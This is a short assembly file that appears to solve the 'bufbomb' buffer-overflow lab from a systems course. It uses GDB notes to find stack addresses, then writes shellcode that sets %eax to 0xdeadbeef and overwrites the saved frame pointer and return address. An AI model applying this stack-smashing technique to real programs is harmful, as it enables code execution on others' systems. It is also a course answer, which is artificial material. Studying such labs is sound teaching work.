# Buffer Overflow Attack for bufbomb 
/*	
 Use GDB to determine value of %ebp saved on stack, as follows:
 (gdb) break getbuf
 (gdb) run
 This causes gdb to stop at instruction 0x80484f2
 (gdb) print /x $ebp-12
 Prints 0xbfffefbc (location of buf)
 (gdb) print /x *$ebp
 Prints 0xbfffefe8 (old value of %ebp)
 (gdb) print /x *($ebp+4)
 Prints 0x8048528 (Return pointer)

 From disassembly, can see that buf will be position 12 bytes
 below saved value of %ebp
*/

/* Find that stack offsets are different when using program
   directly vs. running in GDB.  Ran experiments to
   find that %ebp is 0x40 less when running GDB
*/	
	
	pushl $0x8048528
	movl $0xdeadbeef,%eax
	ret
.align 4
	.long 0xbfffefe8
	.long 0xbfffefbc
